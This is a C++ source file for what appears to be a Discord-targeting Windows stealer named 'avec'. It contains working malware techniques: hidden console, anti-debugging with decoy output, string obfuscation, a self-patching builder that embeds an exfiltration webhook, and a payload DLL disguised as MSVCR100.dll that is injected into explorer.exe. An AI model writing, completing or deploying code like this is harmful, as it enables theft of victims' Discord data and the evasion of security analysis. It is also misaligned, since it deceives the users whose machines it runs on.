#include <iostream>
#include <fstream>
#include <filesystem>

#include <skcrypt/skcrypt.hpp>

#include "patcher.h"
#include "resource.h"
#include "injector.h"

#define WEBHOOK_URL skCrypt("EXAMPLE_HOOK")


typedef BOOL(WINAPI* IsDebPresent)();
typedef BOOL(WINAPI* ShowWindowCustom)(HWND hWnd, int nCmdShow);
typedef HANDLE(WINAPI* pCreateFileMapping)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef void* (WINAPI* pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);


int main(int argc, char** argv) {
	ShowWindowCustom ShowWindow = (ShowWindowCustom)GetProcAddress(GetModuleHandleA(skCrypt("user32.dll")), skCrypt("ShowWindow"));
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	IsDebPresent isDebPresent = (IsDebPresent)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("IsDebuggerPresent"));

	if (isDebPresent()) {
		std::cout << "Hello, World" << std::endl;
#ifndef _DEBUG
		return 0;
#endif
	}

	pCreateFileMapping CreateFileMappingA = (pCreateFileMapping)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("CreateFileMappingA"));
	pMapViewOfFile MapViewOfFileA = (pMapViewOfFile)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("MapViewOfFile"));

	for (int i = 0; i < argc; i++) {
		if (i == 0) {
			Sleep(500);
			std::string executable(argv[i]);

			executable = executable.substr(executable.find_last_of("\\") + 1);
			if (executable.starts_with(skCrypt("patched_"))) {
				if(std::filesystem::exists(skCrypt("avec.exe").decrypt()))
					std::filesystem::remove(skCrypt("avec.exe").decrypt());

				Sleep(500);
				std::filesystem::rename(executable, skCrypt("avec.exe").decrypt());

				MessageBoxA(nullptr, skCrypt("Finished patching..."), skCrypt("avec"), MB_OK | MB_ICONINFORMATION);
				return 0;
			}
		}

		if (i == 1) {
			std::string executable(argv[0]);
			executable = executable.substr(0, executable.find_last_of("\\") + 1);
			executable.append(skCrypt("patched_avec.exe"));


			if (std::filesystem::exists(executable)) {
				std::filesystem::remove(executable);
				Sleep(1000);
			}

			std::filesystem::copy_file(argv[0], executable);

			Sleep(3000);
			std::string text;
			std::ifstream webhookFile(argv[i]);
			
			std::getline(webhookFile, text);
			//std::cout << text << std::endl;
			
			Patcher* p = new Patcher(executable);
			if (!p->Patch(text)) {
				std::cout << skCrypt("Couldn't patch this executable. Please try again. (0x") << std::hex << GetLastError() << ")" << std::dec << std::endl;
				Sleep(5000);
				return 1;
			}

			delete p;

			STARTUPINFOA info = {};
			ZeroMemory(&info, sizeof info);

			info.cb = sizeof(info);

			PROCESS_INFORMATION pInfo = {};
			ZeroMemory(&pInfo, sizeof pInfo);

			CreateProcessA(nullptr, (LPSTR) executable.c_str(), nullptr, nullptr, FALSE, DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP, nullptr, nullptr, &info, &pInfo);
			return 0;
		}
	}

	std::string webhook = WEBHOOK_URL.decrypt();

	if (!webhook.compare(skCrypt("EXAMPLE_HOOK"))) { // NOT SET BY COMPILER
		webhook = resources::ReadResource();

		if (!webhook.compare(skCrypt("EXAMPLE"))) {
			MessageBoxA(nullptr, skCrypt("No webhook was set!"), skCrypt("avec"), MB_OK | MB_ICONERROR);
		}
	}

	manual::kernel32::init();
	manual::shell32::init();

	PWSTR szAppdata;
	manual::shell32::SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &szAppdata);

	std::wcout << szAppdata << std::endl;


	std::wstring discord(szAppdata);
	discord.append(skCrypt(L"/Discord/"));

	std::wcout << discord << std::endl;

	if (manual::kernel32::CreateDirectoryW(discord.c_str(), NULL)) {
		std::cout << "Hello, World" << std::endl;
		return 1;
	}

	if (GetLastError() != ERROR_ALREADY_EXISTS) {
		std::cout << "Hello, World";
		return 1;
	}

	PWSTR szTemp;
	manual::shell32::SHGetKnownFolderPath(FOLDERID_GameTasks, 0, nullptr, &szTemp);
	std::wstring dynamicPath(szTemp);


	std::string path(dynamicPath.begin(), dynamicPath.end());
	path.append(skCrypt("/MSVCR100.dll"));

	resources::CopyResource(102, skCrypt("microsoft").decrypt(), path);

	HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, 1024, skCrypt("Local\\Microsoft"));
	if (!hFile) {
#ifdef _DEBUG
		std::cout << "CreateFileMapping failed: " << GetLastError() << std::endl;
#endif
		return 1;
	}

	char* map = (char*)MapViewOfFileA(hFile, FILE_MAP_ALL_ACCESS, 0, 0, 1024);
	if (!map) {
#ifdef _DEBUG
		std::cout << "MapViewOfFile failed: " << GetLastError() << std::endl;
#endif
		CloseHandle(hFile);
		return 1;
	}

	strcpy_s(map, 1024, webhook.c_str());
	cap::Injector* injector = new cap::Injector(skCrypt("explorer.exe").decrypt(), path);
	if (!injector->Inject()) {
		std::cout << cap::Error::GetLastError() << std::endl;
	}

	Sleep(5000);
	return 0;
}

